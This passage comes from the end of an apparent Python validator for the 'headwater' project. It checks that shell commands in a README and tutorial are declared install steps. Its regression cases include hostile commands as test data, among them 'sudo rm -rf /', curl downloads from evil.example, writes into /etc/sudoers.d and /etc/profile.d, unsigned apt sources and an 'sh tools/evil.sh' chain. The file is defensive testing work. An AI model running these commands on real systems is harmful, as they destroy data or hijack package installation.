    ('an unclosed $( leaves the rest unreadable',
     'echo $(date\nnpm install',
     ['echo $(date', UNREADABLE + '1']),
    ('a quote the block never closes is flagged',
     "echo ok && npm install '",
     ['echo ok', "npm install '", UNREADABLE + '1']),
    # Rule 3 (#1135): inside `$'…'` a backslash escapes the next character.
    ('an ANSI-C quote with an escaped quote hides no chained command',
     "printf $'\\'' && echo RAN-3",
     ['echo RAN-3']),
    # Rule 3: a quote inside backticks on one line opens nothing.
    ('a quote inside backticks opens nothing',
     "echo `echo it's` && npm install\nnpm ci",
     ["echo `echo it's`", 'npm install', 'npm ci']),
    # Rule 4: a `#` after a blank or an operator opens a comment.
    ('an apostrophe in a trailing comment does not hide the next line',
     "headwater check # it's here\nnpm install",
     ['npm install']),
    ('a comment straight after && is no piece',
     "echo a &&# it's\nnpm install",
     ['echo a', 'npm install']),
    # Rule 4: a `#` after `)`, `<` or `>` is part of a word.
    ('a hash after the ) that closes a substitution hides no chained command',
     'echo $(date)#x && npm install',
     ['echo $(date)#x', 'npm install']),
    ('an apostrophe after )# is flagged',
     "(echo a)#'\nnpm install",
     ["(echo a)#'", UNREADABLE + '1']),
    ('an apostrophe after >#it is flagged',
     "echo hi >#it's\nnpm install",
     ["echo hi >#it's", UNREADABLE + '1']),
    # Rule 5: the script skips no here-document body. A body line is read
    # as a command, and an apostrophe in it flags the rest of the block.
    ('an apostrophe in a here-document body flags the rest of the block',
     "cat <<EOF\nit's here\nEOF\nnpm install",
     ['cat <<EOF', "it's here", UNREADABLE + '2']),
    ('an apostrophe in a quoted here-document body flags the rest',
     "cat <<'EOF'\ndon't\nEOF\nnpm install && echo RAN-B2b",
     ["cat <<'EOF'", "don't", UNREADABLE + '2']),
    ('a double quote inside a quoted substitution is a quote of its own',
     'echo "$(echo "it\'s")" && npm install\nnpm ci',
     ['echo "$(echo "it\'s")"', 'npm install', 'npm ci']),
    # Inside `${…}` a `#` is literal and opens no comment (P1e, X1, X2 of
    # the third verify of #1195).
    ('a hash inside a parameter expansion hides no chained command',
     'echo ${x:-a #b} && npm ci',
     ['echo ${x:-a #b}', 'npm ci']),
    ('a hash inside a default value after an allowed word hides nothing',
     'git log ${x:-a #b} && npm ci',
     ['npm ci']),
    ('a hash inside a substitution pattern hides no chained command',
     'echo ${x// #/-} && npm ci',
     ['echo ${x// #/-}', 'npm ci']),
    # Rule 1: an open `${`, and a comment inside an open `$(`, are flagged.
    ('an open ${ leaves the rest unreadable',
     'echo ${x:-a\nnpm ci',
     ['echo ${x:-a', UNREADABLE + '1']),
    # A `#` inside any open span is part of a word, so it opens no comment.
    ('a hash inside an open $( leaves the rest unreadable',
     'x=$(ls # c\nnpm ci',
     ['x=$(ls # c', UNREADABLE + '1']),
    # The open spans are one stack (the fourth verify of #1195). A closer
    # that does not match the innermost span flags the rest of the block.
    ('a close brace inside a substitution inside an expansion is flagged',
     'echo ${x:-$(echo }) #c} && npm ci\nnpm i',
     ['echo ${x:-$(echo }) #c} && npm ci', UNREADABLE + '1']),
    ('a close paren inside an expansion is flagged',
     'echo ${x:-a)} && npm ci\nnpm i',
     ['echo ${x:-a)} && npm ci', UNREADABLE + '1']),
    ('a span closed by its own kind reads on',
     'echo ${x:-$(echo a) #c} && npm ci',
     ['echo ${x:-$(echo a) #c}', 'npm ci']),
    ('a close paren inside double quotes closes nothing',
     'echo "a)" && npm ci',
     ['echo "a)"', 'npm ci']),
    ('an operator inside backticks starts a piece',
     'echo `a && npm ci`',
     ['echo `a', 'npm ci`']),
    # #1230, and the owner's ruling of 2026-09-29 that amends HW-DR-0077
    # clause 1: the APT route. Each program passes only in the shape the
    # README's block runs, with `sudo` or without it.
    ('the APT install block is not undeclared',
     APT_BLOCK,
     []),
    ('the APT install block run as root, with no sudo, is not undeclared',
     APT_BLOCK.replace('sudo ', ''),
     []),
    ('curl to the keyring path from another host is undeclared',
     'sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
     'https://evil.example/apt/headwater-archive-keyring.asc',
     ['sudo curl -fsSL -o /etc/apt/keyrings/headwater-archive-keyring.asc '
      'https://evil.example/apt/headwater-archive-keyring.asc']),
    ('curl of the keyring written outside the keyring directory is undeclared',
     'sudo curl -fsSL -o /etc/sudoers.d/x '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['sudo curl -fsSL -o /etc/sudoers.d/x '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('curl of the keyring climbing out of the keyring directory is undeclared',
     'curl -fsSL -o /etc/apt/keyrings/../../profile.d/x.asc '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['curl -fsSL -o /etc/apt/keyrings/../../profile.d/x.asc '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('curl of another file from the APT site is undeclared',
     'curl -fsSL -o /etc/apt/keyrings/x.asc https://headwater.tools/apt/install.sh',
     ['curl -fsSL -o /etc/apt/keyrings/x.asc https://headwater.tools/apt/install.sh']),
    ('curl of the keyring with a long option is undeclared',
     'curl -fsSL --config /tmp/c -o /etc/apt/keyrings/x.asc '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['curl -fsSL --config /tmp/c -o /etc/apt/keyrings/x.asc '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('a program the APT route does not name, under sudo, is undeclared',
     'sudo rm -rf /',
     ['sudo rm -rf /']),
    ('sudo with an option of its own is undeclared',
     'sudo -u root apt-get update',
     ['sudo -u root apt-get update']),
    ('apt-get installing a package the route does not name is undeclared',
     'sudo apt-get install -y nodejs',
     ['sudo apt-get install -y nodejs']),
    ('apt-get with a subcommand the route does not run is undeclared',
     'apt-get source headwater',
     ['apt-get source headwater']),
    ('apt-get with an option that sets configuration is undeclared',
     'apt-get -o APT::Update::Pre-Invoke::=x update',
     ['apt-get -o APT::Update::Pre-Invoke::=x update']),
    ('tee writing outside the APT source list directory is undeclared',
     'echo x | sudo tee /etc/profile.d/x.sh',
     ['echo x', 'sudo tee /etc/profile.d/x.sh']),
    ('tee appending with an option is undeclared',
     'sudo tee -a /etc/apt/sources.list.d/headwater.list',
     ['sudo tee -a /etc/apt/sources.list.d/headwater.list']),
    ('install making a directory outside the keyring directory is undeclared',
     'sudo install -d -m 0755 /usr/local/bin/x',
     ['sudo install -d -m 0755 /usr/local/bin/x']),
    ('install copying a file, not making a directory, is undeclared',
     'sudo install evil -m 0755 /etc/apt/keyrings',
     ['sudo install evil -m 0755 /etc/apt/keyrings']),
    ('curl of the keyring with TLS checks turned off is undeclared',
     'curl -fsSLk -o /etc/apt/keyrings/x.asc '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['curl -fsSLk -o /etc/apt/keyrings/x.asc '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('curl of the keyring with a quoted URL is undeclared',
     'curl -fsSL -o /etc/apt/keyrings/x.asc '
     '"https://headwater.tools/apt/headwater-archive-keyring.asc"',
     ['curl -fsSL -o /etc/apt/keyrings/x.asc '
      '"https://headwater.tools/apt/headwater-archive-keyring.asc"']),
    # Verify round 1 on #1328. `tee` writes whatever it is handed, so it
    # passes only when the signed sources echo is what it is handed.
    ('tee handed a printf of an unsigned sources line is undeclared',
     "printf 'deb [trusted=yes] http://evil.example/ x main\\n' | sudo tee /etc/apt/sources.list.d/evil.list",
     ['sudo tee /etc/apt/sources.list.d/evil.list']),
    ('tee handed nothing through a pipe is undeclared',
     'sudo tee /etc/apt/sources.list.d/headwater.list',
     ['sudo tee /etc/apt/sources.list.d/headwater.list']),
    ('tee after the sources echo and a third piece is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" | cat | tee /etc/apt/sources.list.d/h.list',
     ['cat', 'tee /etc/apt/sources.list.d/h.list']),
    ('tee writing a second file is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" | tee /etc/apt/sources.list.d/h.list /etc/apt/sources.list.d/i.list',
     ['tee /etc/apt/sources.list.d/h.list /etc/apt/sources.list.d/i.list']),
    ('tee writing a file apt does not read as a source list is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" | tee /etc/apt/sources.list.d/h',
     ['tee /etc/apt/sources.list.d/h']),
    ('install making the keyring directory writable by anyone is undeclared',
     'sudo install -d -m 0777 /etc/apt/keyrings',
     ['sudo install -d -m 0777 /etc/apt/keyrings']),
    ('curl naming the keyring URL twice is undeclared',
     'curl -fsSL -o /etc/apt/keyrings/x.asc '
     'https://headwater.tools/apt/headwater-archive-keyring.asc '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['curl -fsSL -o /etc/apt/keyrings/x.asc '
      'https://headwater.tools/apt/headwater-archive-keyring.asc '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('curl writing the keyring with no .asc suffix is undeclared',
     'curl -fsSL -o /etc/apt/keyrings/x '
     'https://headwater.tools/apt/headwater-archive-keyring.asc',
     ['curl -fsSL -o /etc/apt/keyrings/x '
      'https://headwater.tools/apt/headwater-archive-keyring.asc']),
    ('apt-get update with an option that sets configuration is undeclared',
     'apt-get update -o APT::Update::Pre-Invoke::=sh',
     ['apt-get update -o APT::Update::Pre-Invoke::=sh']),
    ('echo of a sources line for a host that differs by one character is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwaterxtools/apt stable main"',
     ['echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwaterxtools/apt stable main"']),
    ('echo of a sources line whose keyring has no .asc suffix is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k] https://headwater.tools/apt stable main"',
     ['echo "deb [signed-by=/etc/apt/keyrings/k] https://headwater.tools/apt stable main"']),
    ('sudo in front of the sources echo is undeclared',
     'sudo echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main"',
     ['sudo echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main"']),
    ('echo of a sources line for another host is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://evil.example/apt stable main"',
     ['echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://evil.example/apt stable main"']),
    ('echo of a sources line with no signed-by is undeclared',
     'echo "deb [trusted=yes] https://headwater.tools/apt stable main"',
     ['echo "deb [trusted=yes] https://headwater.tools/apt stable main"']),
    ('echo of a sources line redirected into a file is undeclared',
     'echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" > /etc/apt/sources.list',
     ['echo "deb [signed-by=/etc/apt/keyrings/k.asc] https://headwater.tools/apt stable main" > /etc/apt/sources.list']),
]


def run_regression_cases():
    """Every case above, checked against the live functions rather than
    against a snapshot of their output. Returns the labels that failed."""
    failed = []
    for label, block, expected in REGRESSION_CASES:
        got = undeclared_pieces(block)
        ok = got == expected
        print(('ok   ' if ok else 'FAIL ') + 'regression: ' + label)
        if not ok:
            failed.append(label)
            print(f'    expected {expected!r}, got {got!r}')
    return failed


# A whole document's worth of fence parsing, not just one block's content:
# the parity bug an info-string fence caused could only show up across more
# than one block, since a flipped `inside` reads the next block's command
# as prose and the prose after it as a command.
FENCE_REGRESSION_CASES = [
    ('an info-string fence (```sh) is still a fence, and its bare close '
     'does not flip the blocks after it',
     'prose before\n\n'
     '```sh\n'
     'echo one\n'
     '```\n\n'
     'prose between\n\n'
     '```\n'
     'echo two\n'
     '```\n',
     ['echo one', 'echo two']),
    ('a tilde fence with an info string is still a fence',
     '~~~console\n'
     'echo three\n'
     '~~~\n',
     ['echo three']),
    ('the real attack: an undeclared script inside an info-string fence '
     'is still reached, and a real block after it still parses',
     '## Status\n\n'
     '```sh\n'
     'git clone https://example.com/x & sh tools/evil.sh\n'
     '```\n\n'
     '```\n'
     'headwater check\n'
     '```\n',
     ['git clone https://example.com/x & sh tools/evil.sh', 'headwater check']),
]


# A whole document's command blocks in order, because whether `cargo` may
# appear depends on what came before it: HW-DR-0077 makes the release
# download the lead route and `cargo` a labeled alternative after it. Each
# entry is (label, command blocks in document order, whether the document
# may offer `cargo` after a download, the undeclared pieces expected).
DOWNLOAD_BLOCK = (
    'mkdir -p ~/.local/bin\n'
    'curl -fsSLO https://github.com/headwater-ai/headwater/releases/download/'
    'v0.2.1/headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz\n'
    'tar -xzf headwater-v0.2.1-x86_64-unknown-linux-musl.tar.gz -C ~/.local/bin headwater')
SOURCE_BUILD_BLOCK = (
    'git clone https://github.com/headwater-ai/headwater.git\n'
    'cd headwater\n'
    'git checkout v0.2.1\n'
    'cargo build --release -p headwater-cli --manifest-path engine/Cargo.toml --locked')
DOCUMENT_REGRESSION_CASES = [
    ('a document whose only install block is cargo install is reported',
     ['cargo install headwater-cli'], True,
     ['cargo install headwater-cli']),
    ('cargo install after the release download is the labeled alternative',
     [DOWNLOAD_BLOCK, 'cargo install headwater-cli', SOURCE_BUILD_BLOCK], True,
     []),
    ('cargo install before the release download still leads, and is reported',
     ['cargo install headwater-cli', DOWNLOAD_BLOCK], True,
     ['cargo install headwater-cli']),
    ('the tutorial offers no cargo route, even after the download',
     [DOWNLOAD_BLOCK, 'cargo install headwater-cli'], False,
     ['cargo install headwater-cli']),
    ('cargo after a download is still held to install and build',
     [DOWNLOAD_BLOCK, 'cargo run --manifest-path tools/evil/Cargo.toml'], True,
     ['cargo run --manifest-path tools/evil/Cargo.toml']),
]


def run_document_regression_cases():
    """Every case above, checked against `undeclared_in_document`."""
    failed = []
    for label, blocks, cargo_may_follow, expected in DOCUMENT_REGRESSION_CASES:
        got = undeclared_in_document(blocks, cargo_may_follow)
        ok = got == expected
        print(('ok   ' if ok else 'FAIL ') + 'document regression: ' + label)
        if not ok:
            failed.append(label)
            print(f'    expected {expected!r}, got {got!r}')
    return failed


def run_fence_regression_cases():
    """Every case above, checked against `parse_fenced_blocks` directly."""
    failed = []
    for label, document, expected in FENCE_REGRESSION_CASES:
        got = parse_fenced_blocks(document)
        ok = got == expected
        print(('ok   ' if ok else 'FAIL ') + 'fence regression: ' + label)
        if not ok:
            failed.append(label)
            print(f'    expected {expected!r}, got {got!r}')
    return failed


def main():
    root = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.getcwd()

    regression_failures = (run_regression_cases() + run_fence_regression_cases()
                           + run_document_regression_cases())

    readme_blocks = fenced_blocks(os.path.join(root, README))
    all_tutorial_blocks = fenced_blocks(os.path.join(root, TUTORIAL))
    tutorial_blocks = [all_tutorial_blocks[i] for i in sorted(drive.COMMAND_BLOCK_INDICES)]

    checked = len(readme_blocks) + len(tutorial_blocks)
    failures = []
    for piece in undeclared_in_document(readme_blocks, cargo_may_follow_download=True):
        failures.append(f'{README}: undeclared command: {piece!r}')
    for piece in undeclared_in_document(tutorial_blocks, cargo_may_follow_download=False):
        failures.append(f'{TUTORIAL}: undeclared command: {piece!r}')

    total_cases = (len(REGRESSION_CASES) + len(FENCE_REGRESSION_CASES)
                   + len(DOCUMENT_REGRESSION_CASES))
    print(f'{total_cases} regression case(s), {len(regression_failures)} failed; '
          f'{checked} command block(s) checked across 2 documents, '
          f'{len(failures)} undeclared command(s)')
    for failure in failures:
        print(' - ' + failure)
    return 1 if (failures or regression_failures) else 0


if __name__ == '__main__':
    sys.exit(main())
